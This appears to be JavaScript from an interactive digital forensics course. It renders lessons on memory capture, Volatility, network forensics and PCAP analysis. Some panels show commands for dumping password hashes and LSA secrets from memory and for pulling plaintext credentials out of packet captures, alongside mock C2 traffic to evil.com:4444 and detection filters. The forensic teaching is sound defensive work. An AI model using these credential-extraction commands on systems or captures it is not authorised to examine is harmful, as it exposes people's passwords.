            defense: 'DEFENDING AGAINST ANTI-FORENSICS:\n\n🛡️ PREVENTIVE MEASURES:\n   • Centralized logging (can\'t delete)\n   • Log integrity monitoring\n   • Regular backups\n   • EDR solutions\n\n🛡️ DETECTION CAPABILITIES:\n   • SIEM correlation rules\n   • File integrity monitoring\n   • User behavior analytics\n   • Memory forensics capability\n\n🛡️ COLLECTION BEST PRACTICES:\n   • Memory capture FIRST\n   • Network captures (real-time)\n   • Multiple evidence sources\n   • Timeline correlation\n\n🛡️ ANALYSIS TECHNIQUES:\n   • Cross-validate artifacts\n   • Look for absence of evidence\n   • Check multiple timestamps\n   • Analyze tool artifacts\n\n⚠️ REMEMBER:\n   "The absence of evidence\n    is not evidence of absence"\n   Look for what SHOULD be there!'
        };
        $('#antiOut').textContent = data.techniques;
        $$('#antiTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#antiTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#antiOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 51: memory-forensics-intro - Memory Forensics Introduction
    function demoMemoryForensicsIntro(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">MEMORY</span><span class="demo-title">Memory Forensics Introduction</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="memIntroTabs">
                <button class="demo-btn demo-btn-sm active" data-t="why">Why Memory?</button>
                <button class="demo-btn demo-btn-sm" data-t="what">What\'s In RAM?</button>
                <button class="demo-btn demo-btn-sm" data-t="volatile">Volatility Order</button>
            </div>
            <div id="memIntroOut" style="background:#1a1a2e;color:#b388ff;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            why: 'WHY MEMORY FORENSICS?\n\n┌─────────────────────────────────────┐\n│ MEMORY = Volatile Evidence          │\n│ Power off → Data LOST forever       │\n└─────────────────────────────────────┘\n\nWHAT DISK FORENSICS CAN\'T FIND:\n\n  🔐 ENCRYPTION KEYS\n     In memory while volume mounted!\n     \n  🦠 FILELESS MALWARE\n     Never touches disk\n     Lives only in memory\n     \n  💻 RUNNING PROCESSES\n     Injected code\n     Hidden processes\n     \n  🔑 CREDENTIALS\n     Passwords in memory\n     Session tokens\n     \n  🌐 NETWORK CONNECTIONS\n     Active connections\n     Command & control\n\n⚠️ CAPTURE MEMORY FIRST!\n   Before pulling the plug\n   Before running AV\n   Before any disk changes',
            what: 'WHAT\'S IN MEMORY?\n\n┌─────────────────────────────────────┐\n│ RUNNING PROCESSES                   │\n│ • Process list (real & hidden)      │\n│ • Process tree (parent/child)       │\n│ • Command line arguments            │\n│ • Environment variables             │\n├─────────────────────────────────────┤\n│ LOADED CODE                         │\n│ • DLLs and shared libraries         │\n│ • Injected code                     │\n│ • Packed/unpacked malware           │\n├─────────────────────────────────────┤\n│ NETWORK                             │\n│ • Active connections                │\n│ • Listening ports                   │\n│ • Socket information                │\n├─────────────────────────────────────┤\n│ SENSITIVE DATA                      │\n│ • Passwords (plaintext!)            │\n│ • Encryption keys                   │\n│ • Clipboard contents                │\n│ • Chat messages                     │\n├─────────────────────────────────────┤\n│ SYSTEM INFO                         │\n│ • Registry (in memory)              │\n│ • User sessions                     │\n│ • Kernel structures                 │\n└─────────────────────────────────────┘',
            volatile: 'ORDER OF VOLATILITY:\n\nCollect evidence most volatile first!\n\n┌─────────────────────────────────────┐\n│ 1. CPU Registers, Cache             │\n│    (Nanoseconds)                    │\n│    - Extremely difficult to capture │\n├─────────────────────────────────────┤\n│ 2. Memory (RAM) ← FOCUS HERE        │\n│    (Seconds-Minutes)                │\n│    - Capture with memory tools      │\n├─────────────────────────────────────┤\n│ 3. Network State                    │\n│    (Seconds)                        │\n│    - Active connections, ARP        │\n├─────────────────────────────────────┤\n│ 4. Running Processes                │\n│    (Seconds-Minutes)                │\n│    - Depends on memory capture      │\n├─────────────────────────────────────┤\n│ 5. Disk                             │\n│    (Months-Years)                   │\n│    - More stable, less urgent       │\n├─────────────────────────────────────┤\n│ 6. Backups/Archives                 │\n│    (Years)                          │\n│    - Most stable                    │\n└─────────────────────────────────────┘'
        };
        $('#memIntroOut').textContent = data.why;
        $$('#memIntroTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#memIntroTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#memIntroOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 52: memory-analysis - Memory Analysis Techniques
    function demoMemoryAnalysis(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">ANALYZE</span><span class="demo-title">Memory Analysis Techniques</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="memAnalysisTabs">
                <button class="demo-btn demo-btn-sm active" data-t="process">Process Analysis</button>
                <button class="demo-btn demo-btn-sm" data-t="network">Network</button>
                <button class="demo-btn demo-btn-sm" data-t="malware">Malware</button>
            </div>
            <div id="memAnalysisOut" style="background:#0d1117;color:#d2a8ff;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            process: 'PROCESS ANALYSIS:\n\n# List all processes\n$ vol.py -f memory.raw pslist\nPID   PPID  Name           Start\n4     0     System         2024-01-15\n316   4     smss.exe       2024-01-15\n884   660   svchost.exe    2024-01-15\n1337  884   evil.exe       2024-01-15 ← SUS!\n\n# Process tree (parent/child)\n$ vol.py -f memory.raw pstree\nSystem\n└─smss.exe\n  └─csrss.exe\n  └─wininit.exe\n    └─services.exe\n      └─svchost.exe\n        └─evil.exe ← Suspicious parent!\n\n# Hidden processes\n$ vol.py -f memory.raw psxview\nProcess     pslist psscan thrdproc\nevil.exe    False  True   True ← HIDDEN!\n\nRED FLAGS:\n  • Unknown process names\n  • Unusual parent/child\n  • Hidden from pslist\n  • Misspelled system names',
            network: 'NETWORK ANALYSIS IN MEMORY:\n\n# Active connections\n$ vol.py -f memory.raw netscan\nProto  Local            Foreign          State    PID\nTCPv4  192.168.1.5:443  evil.com:4444    ESTAB    1337\nTCPv4  192.168.1.5:80   0.0.0.0          LISTEN   4\n\n# Sockets\n$ vol.py -f memory.raw sockets\nPID   Port  Proto  Address\n1337  4444  TCP    0.0.0.0  ← Backdoor port!\n\nANALYSIS STEPS:\n  1. Identify unknown connections\n  2. Correlate PID with process\n  3. Check destination IPs\n  4. Look for C2 patterns\n\nC2 INDICATORS:\n  • Connections to unusual ports\n  • Beaconing patterns\n  • Known malicious IPs\n  • Encrypted traffic to IP (no DNS)\n\n$ vol.py -f memory.raw connscan\n  ↑ Finds closed connections too!',
            malware: 'MALWARE HUNTING IN MEMORY:\n\n# Dump suspicious process\n$ vol.py -f memory.raw procdump -p 1337\n  -D dump/\nSaved: executable.1337.exe\n\n# Extract injected code\n$ vol.py -f memory.raw malfind\nProcess: evil.exe PID: 1337\nVAD: 0x400000-0x405000\nFlags: PAGE_EXECUTE_READWRITE ← SUS!\n\n0x00400000  4d 5a 90 00 03 00 00 00  MZ......\n            ↑ PE header in RWX memory!\n\n# DLL analysis\n$ vol.py -f memory.raw dlllist -p 1337\nBase       Size   Path\n0x76000000 0x1000 unknown.dll ← No path!\n\n# YARA scanning\n$ vol.py -f memory.raw yarascan \n  -Y "rule evil { strings: $a = \\"C2\\" }"'
        };
        $('#memAnalysisOut').textContent = data.process;
        $$('#memAnalysisTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#memAnalysisTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#memAnalysisOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 53: memory-captures - Memory Capture Techniques
    function demoMemoryCaptures(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-warning">CAPTURE</span><span class="demo-title">Memory Capture Techniques</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="memCapTabs">
                <button class="demo-btn demo-btn-sm active" data-t="windows">Windows</button>
                <button class="demo-btn demo-btn-sm" data-t="linux">Linux</button>
                <button class="demo-btn demo-btn-sm" data-t="tips">Best Practices</button>
            </div>
            <div id="memCapOut" style="background:#1a1a1a;color:#ffb74d;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            windows: 'WINDOWS MEMORY CAPTURE:\n\nFTK IMAGER (GUI - Recommended):\n  1. File → Capture Memory\n  2. Select destination path\n  3. Click "Capture Memory"\n  Output: memdump.mem\n\nWINPMEM (CLI):\n  > winpmem_mini_x64.exe output.raw\n  \n  Features:\n  • Minimal footprint\n  • Raw format output\n  • Fast acquisition\n\nDUMPIT (One-click):\n  > DumpIt.exe\n  Creates: COMPUTERNAME-YYYYMMDD.raw\n  \nBELKASOFT RAM CAPTURER (Free):\n  GUI tool, user-friendly\n\n⚠️ RUN AS ADMINISTRATOR!\n   Memory capture requires privileges\n\nOUTPUT FORMATS:\n  .raw  - Raw memory dump\n  .mem  - FTK format\n  .vmem - VMware memory\n  .lime - Linux LiME format',
            linux: 'LINUX MEMORY CAPTURE:\n\nLiME (Linux Memory Extractor):\n\n# Build the kernel module\n$ git clone https://github.com/504ensicsLabs/LiME\n$ cd LiME/src\n$ make\n\n# Load module and capture\n$ sudo insmod lime-$(uname -r).ko \\\n    "path=/tmp/memory.lime format=lime"\n\n# Format options:\n  lime - LiME format (recommended)\n  padded - Null-padded gaps\n  raw - Raw format\n\nAVML (Microsoft):\n  Faster, no kernel module needed\n  $ sudo avml memory.lime\n\nFMEM:\n  Creates /dev/fmem device\n  $ sudo dd if=/dev/fmem of=memory.raw\n\n/PROC/KCORE:\n  $ sudo dd if=/proc/kcore of=mem.raw\n  (Pseudo-file, not complete dump)\n\n⚠️ Must match kernel version!\n   LiME module = target kernel',
            tips: 'MEMORY CAPTURE BEST PRACTICES:\n\n✅ DO:\n   • Capture memory FIRST\n   • Use write blocker for destination\n   • Document the capture process\n   • Hash the output immediately\n   • Note the time and who captured\n   • Test tools BEFORE incidents\n\n❌ DON\'T:\n   • Write to the evidence drive\n   • Reboot the system first\n   • Run untested tools\n   • Delay - memory changes constantly\n\n📝 DOCUMENTATION:\n   ┌─────────────────────────────────┐\n   │ Memory Capture Log             │\n   │ Date/Time: 2024-01-15 14:30    │\n   │ Examiner: J. Smith             │\n   │ Tool: FTK Imager 4.7           │\n   │ Output: memory.mem             │\n   │ Size: 16,384 MB                │\n   │ Hash: SHA256: a7f8e3c9...      │\n   └─────────────────────────────────┘\n\n⚠️ VOLATILE!\n   Every second counts!'
        };
        $('#memCapOut').textContent = data.windows;
        $$('#memCapTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#memCapTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#memCapOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 54: volatility-framework - Volatility Framework
    function demoVolatilityFramework(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-success">VOLATILITY</span><span class="demo-title">Volatility Framework</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="volTabs">
                <button class="demo-btn demo-btn-sm active" data-t="intro">Introduction</button>
                <button class="demo-btn demo-btn-sm" data-t="plugins">Key Plugins</button>
                <button class="demo-btn demo-btn-sm" data-t="workflow">Workflow</button>
            </div>
            <div id="volOut" style="background:#0d1117;color:#7ee787;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            intro: 'VOLATILITY FRAMEWORK:\n\nThe #1 memory forensics framework\nOpen source, Python-based\n\nVERSIONS:\n  Volatility 2: Python 2, legacy\n  Volatility 3: Python 3, current\n\nINSTALLATION:\n  $ pip install volatility3\n  \n  # Or from source\n  $ git clone https://github.com/\n      volatilityfoundation/volatility3\n  $ python setup.py install\n\nBASIC USAGE:\n  # Volatility 3\n  $ vol -f memory.raw windows.info\n  \n  # Volatility 2\n  $ vol.py -f memory.raw imageinfo\n  $ vol.py -f memory.raw --profile=Win10x64\n      pslist\n\nSYMBOL TABLES:\n  Vol3 auto-downloads symbols\n  Vol2 needs --profile parameter',
            plugins: 'KEY VOLATILITY PLUGINS:\n\nPROCESS:\n  windows.pslist     - Process list\n  windows.pstree     - Process tree\n  windows.cmdline    - Command lines\n  windows.dlllist    - Loaded DLLs\n\nNETWORK:\n  windows.netscan    - Connections\n  windows.netstat    - Network stats\n\nMALWARE:\n  windows.malfind    - Injected code\n  windows.ldrmodules - Hidden DLLs\n  yarascan           - YARA rules\n\nMEMORY:\n  windows.memmap     - Memory map\n  windows.vadinfo    - VAD info\n  windows.handles    - Open handles\n\nCREDENTIALS:\n  windows.hashdump   - SAM hashes\n  windows.lsadump    - LSA secrets\n  windows.cachedump  - Cached creds\n\nREGISTRY:\n  windows.registry.* - Registry hives\n\nTIMELINE:\n  timeliner          - All timestamps',
            workflow: 'VOLATILITY ANALYSIS WORKFLOW:\n\n1. IDENTIFY THE IMAGE:\n   $ vol -f memory.raw windows.info\n   \n   Variable  Value\n   Kernel    10.0.19041\n   OS        Windows 10\n\n2. PROCESS ANALYSIS:\n   $ vol -f memory.raw windows.pslist\n   $ vol -f memory.raw windows.pstree\n   \n   Look for:\n   • Unknown processes\n   • Suspicious parents\n   • Hidden processes\n\n3. NETWORK ANALYSIS:\n   $ vol -f memory.raw windows.netscan\n   \n   Look for:\n   • C2 connections\n   • Unusual ports\n\n4. MALWARE HUNTING:\n   $ vol -f memory.raw windows.malfind\n   \n   Look for:\n   • RWX memory regions\n   • Injected code\n\n5. DUMP & ANALYZE:\n   $ vol -f memory.raw -o dump/ \\\n       windows.dumpfiles --pid 1337'
        };
        $('#volOut').textContent = data.intro;
        $$('#volTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#volTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#volOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 55: network-forensics - Network Forensics
    function demoNetworkForensics(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">NETWORK</span><span class="demo-title">Network Forensics</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="netForTabs">
                <button class="demo-btn demo-btn-sm active" data-t="what">What Is It?</button>
                <button class="demo-btn demo-btn-sm" data-t="sources">Data Sources</button>
                <button class="demo-btn demo-btn-sm" data-t="analysis">Analysis</button>
            </div>
            <div id="netForOut" style="background:#1a1a2e;color:#64b5f6;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            what: 'NETWORK FORENSICS:\n\nCapturing and analyzing network traffic\nto investigate security incidents.\n\n┌─────────────────────────────────────┐\n│ WHY NETWORK FORENSICS?              │\n├─────────────────────────────────────┤\n│ • Attacker communication (C2)       │\n│ • Data exfiltration detection       │\n│ • Lateral movement tracking         │\n│ • Malware download sources          │\n│ • Timeline of network events        │\n│ • Evidence for prosecution          │\n└─────────────────────────────────────┘\n\nCHALLENGES:\n  📊 Volume - Huge amounts of data\n  🔒 Encryption - TLS hides content\n  ⏰ Retention - Storage costs\n  ⚖️ Privacy - Legal considerations\n\nCAPTURE POINTS:\n  • Network tap (passive)\n  • SPAN/mirror port (switch)\n  • Proxy/firewall logs\n  • Host-based capture',
            sources: 'NETWORK DATA SOURCES:\n\n📦 FULL PACKET CAPTURE (PCAP):\n   Complete packets - most detailed\n   Storage: ~1GB per hour (busy network)\n   Tools: tcpdump, Wireshark, NetworkMiner\n\n📊 NETFLOW/IPFIX:\n   Metadata only (src, dst, ports, bytes)\n   Storage: Much smaller than PCAP\n   Tools: nfdump, SiLK, ntopng\n\n📋 LOGS:\n   • Firewall logs\n   • Proxy logs\n   • DNS query logs\n   • IDS/IPS alerts\n   • DHCP lease logs\n\n🔍 ZEEK (BRO):\n   Network analysis framework\n   Generates structured logs:\n   • conn.log - Connections\n   • dns.log - DNS queries\n   • http.log - HTTP requests\n   • ssl.log - TLS connections\n   • files.log - File transfers',
            analysis: 'NETWORK FORENSIC ANALYSIS:\n\n1. IDENTIFY TIMEFRAME:\n   When did the incident occur?\n   Filter captures to that window\n\n2. IDENTIFY HOSTS:\n   $ tshark -r capture.pcap \\\n       -T fields -e ip.src -e ip.dst \\\n       | sort -u\n\n3. ANALYZE CONNECTIONS:\n   $ tshark -r capture.pcap \\\n       -q -z conv,tcp\n\n4. EXTRACT INDICATORS:\n   • IP addresses (C2 servers)\n   • Domain names\n   • URLs\n   • File hashes\n   • User agents\n\n5. RECONSTRUCT ACTIVITY:\n   $ tshark -r capture.pcap \\\n       -Y "ip.addr==evil.ip" \\\n       -T fields -e frame.time \\\n       -e ip.src -e ip.dst -e tcp.port\n\n6. EXTRACT FILES:\n   NetworkMiner → Files tab\n   Wireshark → Export Objects'
        };
        $('#netForOut').textContent = data.what;
        $$('#netForTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#netForTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#netForOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 56: wireshark-tcpdump - Wireshark & tcpdump
    function demoWiresharkTcpdump(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-success">TOOLS</span><span class="demo-title">Wireshark & tcpdump</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="wiresharkTabs">
                <button class="demo-btn demo-btn-sm active" data-t="tcpdump">tcpdump</button>
                <button class="demo-btn demo-btn-sm" data-t="wireshark">Wireshark</button>
                <button class="demo-btn demo-btn-sm" data-t="filters">Display Filters</button>
            </div>
            <div id="wiresharkOut" style="background:#0d1117;color:#56d364;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            tcpdump: 'TCPDUMP - CLI Packet Capture:\n\n# Capture all traffic\n$ sudo tcpdump -i eth0 -w capture.pcap\n\n# Capture specific host\n$ tcpdump host 192.168.1.100\n\n# Capture specific port\n$ tcpdump port 80\n$ tcpdump port 443 or port 80\n\n# Capture specific protocol\n$ tcpdump tcp\n$ tcpdump icmp\n\n# Read existing capture\n$ tcpdump -r capture.pcap\n\n# Show packet contents\n$ tcpdump -X -r capture.pcap\n\n# Filter combinations\n$ tcpdump -i eth0 \\\n    \'host 192.168.1.1 and port 443\'\n\nUSEFUL FLAGS:\n  -n    No DNS resolution\n  -v    Verbose\n  -c 10 Capture only 10 packets\n  -A    ASCII output\n  -X    Hex + ASCII output',
            wireshark: 'WIRESHARK - GUI Analysis:\n\nFEATURES:\n  • Live capture and offline analysis\n  • Deep protocol inspection\n  • Follow TCP/UDP streams\n  • Export objects (files)\n  • Statistics and graphs\n  • Color-coded packets\n\nKEY FEATURES:\n\n  Follow Stream:\n    Right-click packet → Follow → TCP Stream\n    Shows full conversation\n\n  Export Objects:\n    File → Export Objects → HTTP\n    Extracts transferred files\n\n  Statistics:\n    Statistics → Conversations\n    Statistics → Protocol Hierarchy\n    Statistics → Endpoints\n\n  Coloring Rules:\n    View → Coloring Rules\n    Red = Errors, TCP problems\n    Green = HTTP\n    Blue = DNS\n\nTSHARK (CLI Wireshark):\n  $ tshark -r capture.pcap -Y "http"',
            filters: 'WIRESHARK DISPLAY FILTERS:\n\nPROTOCOL FILTERS:\n  http         - HTTP traffic\n  dns          - DNS queries\n  tcp          - TCP packets\n  tls          - TLS/SSL traffic\n  icmp         - ICMP (ping)\n\nIP FILTERS:\n  ip.addr == 192.168.1.1\n  ip.src == 10.0.0.1\n  ip.dst == 8.8.8.8\n\nPORT FILTERS:\n  tcp.port == 80\n  tcp.srcport == 443\n  udp.dstport == 53\n\nHTTP FILTERS:\n  http.request.method == "POST"\n  http.host contains "evil"\n  http.response.code == 200\n\nCOMBINATIONS:\n  ip.src==10.0.0.1 and tcp.port==80\n  http or dns\n  !(arp or icmp)\n  tcp.flags.syn == 1\n\nFIND SUSPICIOUS:\n  http.request.uri contains "cmd"\n  tcp.port == 4444\n  dns.qry.name contains "evil"'
        };
        $('#wiresharkOut').textContent = data.tcpdump;
        $$('#wiresharkTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#wiresharkTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#wiresharkOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 57: pcap-analysis - PCAP Analysis
    function demoPcapAnalysis(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">PCAP</span><span class="demo-title">PCAP Analysis</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="pcapTabs">
                <button class="demo-btn demo-btn-sm active" data-t="overview">Overview</button>
                <button class="demo-btn demo-btn-sm" data-t="investigate">Investigation</button>
                <button class="demo-btn demo-btn-sm" data-t="extract">Extraction</button>
            </div>
            <div id="pcapOut" style="background:#1e1e1e;color:#9cdcfe;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            overview: 'PCAP ANALYSIS OVERVIEW:\n\nSTART WITH STATISTICS:\n\n# Protocol hierarchy\n$ tshark -r capture.pcap -q -z io,phs\n\nFrame (100%)\n└─Ethernet (100%)\n  └─IPv4 (95%)\n    └─TCP (80%)\n      └─HTTP (40%)\n      └─TLS (35%)\n    └─UDP (15%)\n      └─DNS (10%)\n\n# Conversations\n$ tshark -r capture.pcap -q -z conv,tcp\n\nIP A        Port  IP B        Port  Frames\n10.0.0.5    49234 evil.com    4444  523 ←SUS!\n10.0.0.5    443   google.com  443   45\n\n# Endpoints\n$ tshark -r capture.pcap -q -z endpoints,ip\n\nAddress      Packets  Bytes\n10.0.0.5     1523     2.5 MB\nevil.com     520      1.8 MB ← High traffic!',
            investigate: 'PCAP INVESTIGATION:\n\n1. IDENTIFY SUSPICIOUS TRAFFIC:\n   $ tshark -r capture.pcap \\\n       -Y "ip.dst==evil.com"\n\n2. FOLLOW THE STREAM:\n   $ tshark -r capture.pcap \\\n       -Y "tcp.stream==5" -T fields \\\n       -e data.text\n\n   Wireshark: Right-click → Follow Stream\n\n3. CHECK DNS QUERIES:\n   $ tshark -r capture.pcap \\\n       -Y "dns.qry.type==A" \\\n       -T fields -e dns.qry.name\n   \n   evil-c2.com        ← Suspicious!\n   update.microsoft.com\n   google.com\n\n4. ANALYZE HTTP:\n   $ tshark -r capture.pcap \\\n       -Y "http.request" \\\n       -T fields -e http.host \\\n       -e http.request.uri\n\n5. CHECK FOR DATA EXFIL:\n   Large outbound transfers\n   Unusual protocols (DNS, ICMP)\n   Encrypted to suspicious IPs',
            extract: 'EXTRACTING DATA FROM PCAP:\n\nEXTRACT FILES (Wireshark):\n  File → Export Objects → HTTP\n  Saves all transferred files\n\nEXTRACT FILES (CLI):\n  $ tshark -r capture.pcap \\\n      --export-objects http,./output/\n\nNETWORKMINER:\n  GUI tool - auto-extracts:\n  • Files\n  • Images\n  • Credentials\n  • Sessions\n\nFOREMOST ON PCAP:\n  $ foremost -i capture.pcap -o carved/\n  Carves files from raw PCAP\n\nEXTRACT CREDENTIALS:\n  $ tshark -r capture.pcap \\\n      -Y "http.request.method==POST" \\\n      -T fields -e http.file_data\n\n  Look for:\n  • username=, password=\n  • Basic auth headers\n  • FTP credentials (plaintext!)\n\nZEEK ANALYSIS:\n  $ zeek -r capture.pcap\n  Creates: conn.log, http.log, etc.'
        };
        $('#pcapOut').textContent = data.overview;
        $$('#pcapTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#pcapTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#pcapOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 16: security-distros-intro - Introduction to Security Distributions
    function demoSecurityDistrosIntro(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-warning">DISTROS</span><span class="demo-title">Security Distributions Overview</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="distroIntroTabs">
                <button class="demo-btn demo-btn-sm active" data-t="what">What Are They?</button>
                <button class="demo-btn demo-btn-sm" data-t="why">Why Use Them?</button>
                <button class="demo-btn demo-btn-sm" data-t="types">Types</button>
            </div>
            <div id="distroIntroOut" class="demo-code-block" style="min-height:180px;text-align:left;font-size:13px;padding:16px">
Security distributions are specialized Linux operating systems pre-configured with cybersecurity tools.

<b>Examples:</b>
• Kali Linux - Penetration testing & offensive security
• Parrot Security - Privacy & pentesting combined
• SIFT - Digital forensics & incident response
• REMnux - Malware analysis & reverse engineering

They save time by bundling 100s of tools pre-installed and configured.</div>
        </div></div>`;
        const data = {
            what: `Security distributions are specialized Linux operating systems pre-configured with cybersecurity tools.

<b>Examples:</b>
• Kali Linux - Penetration testing & offensive security
• Parrot Security - Privacy & pentesting combined
• SIFT - Digital forensics & incident response
• REMnux - Malware analysis & reverse engineering

They save time by bundling 100s of tools pre-installed and configured.`,
            why: `<b>✅ Advantages:</b>
• Pre-installed tools (100s of security utilities)
• Pre-configured environments (no setup hassles)
• Regular security updates & patches
• Community support & documentation
• Isolated testing environment

<b>❌ Disadvantages:</b>
• Large download sizes (2-4 GB ISOs)
• Hardware compatibility issues possible
• Learning curve for beginners
• Some tools may be outdated`,
            types: `<b>🔴 Offensive (Pentesting):</b>
• Kali Linux, Parrot Security, BlackArch

<b>🔵 Defensive (Forensics/IR):</b>
• SIFT Workstation, CAINE, Paladin

<b>🟢 Privacy-Focused:</b>
• Tails OS, Whonix, Qubes OS

<b>🟡 Specialized:</b>
• REMnux (Malware Analysis)
• Flare VM (Windows Forensics)
• CSI Linux (OSINT)`
        };
        pane.querySelectorAll('#distroIntroTabs button').forEach(b => {
            b.onclick = () => {
                pane.querySelectorAll('#distroIntroTabs button').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                pane.querySelector('#distroIntroOut').innerHTML = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 20: slingshot-sift - Slingshot and SIFT Forensic Distributions
    function demoSlingshotSift(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">FORENSICS</span><span class="demo-title">Slingshot & SIFT Forensic Distros</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="siftTabs">
                <button class="demo-btn demo-btn-sm active" data-t="sift">SIFT Workstation</button>
                <button class="demo-btn demo-btn-sm" data-t="tools">Forensic Tools</button>
                <button class="demo-btn demo-btn-sm" data-t="workflow">Workflow</button>
            </div>
            <div id="siftOut" style="background:#1a1a2e;color:#80deea;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            sift: 'SIFT WORKSTATION:\n\n🔧 SANS Investigative Forensic Toolkit\n📦 Based on: Ubuntu 20.04 LTS\n🏢 Maintainer: SANS DFIR Team\n\nINSTALLATION OPTIONS:\n  • Full VM download (.ova)\n  • CAST installer (add to existing Ubuntu)\n  • WSL2 compatible\n\nSYSTEM REQUIREMENTS:\n  • RAM: 8GB+ recommended\n  • Storage: 50GB+\n  • 64-bit processor\n\nDOWNLOAD:\n  https://www.sans.org/tools/sift-workstation/\n\n# CAST Installation:\n$ curl -L https://sift-cli.s3.amazonaws.com/\n    sift-cli-linux -o /usr/local/bin/sift\n$ chmod +x /usr/local/bin/sift\n$ sudo sift install',
            tools: 'SIFT FORENSIC TOOLS:\n\n┌─────────────────────────────────────┐\n│ DISK FORENSICS                      │\n│ • Autopsy (GUI analysis)            │\n│ • Sleuth Kit (CLI suite)            │\n│ • foremost, scalpel (carving)       │\n│ • bulk_extractor (data extraction)  │\n├─────────────────────────────────────┤\n│ MEMORY FORENSICS                    │\n│ • Volatility 2 & 3                  │\n│ • LiME (memory acquisition)         │\n│ • rekall                            │\n├─────────────────────────────────────┤\n│ TIMELINE ANALYSIS                   │\n│ • log2timeline/plaso                │\n│ • timesketch (visualization)        │\n├─────────────────────────────────────┤\n│ WINDOWS ARTIFACTS                   │\n│ • RegRipper (registry)              │\n│ • libvshadow (shadow copies)        │\n│ • libesedb (ESE databases)          │\n├─────────────────────────────────────┤\n│ NETWORK FORENSICS                   │\n│ • Wireshark                         │\n│ • NetworkMiner                      │\n└─────────────────────────────────────┘',
